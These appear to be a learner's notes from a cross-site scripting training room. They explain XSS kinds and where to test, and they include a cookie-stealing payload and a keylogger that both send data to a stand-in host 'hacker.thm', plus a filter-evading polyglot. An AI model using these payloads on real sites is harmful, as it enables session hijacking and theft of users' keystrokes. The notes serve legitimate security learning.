# Room: Intro to Cross-site scripting

## Key Concept
- XSS is a injection attack where malicious JS gets injected into a web application with the intention of being executed by other users.
- Can use alert as a way to prove a site is XSS vulnerable
- Can steal session data using:
```JavaScript
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```
- Keylogger:
```JavaScript
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

### Testing for XSS
- Parameters in the URL query string
- URL file path
- Sometimes in HTTP headers

### Stored XSS
- Malicious code stored on site (such as code in a comment stored on DB)
- Victim views comment, runs code in victims browser

#### Testing for Stored XSS
- Test every possible point of entry where it seems data is stored and then shown back in areas other users have access to

## Tools / commands
- XSS hunter express: can be used for blind XSS attacks
- JS polyglot, An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one:
    - ```JavaScript
    jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
    ```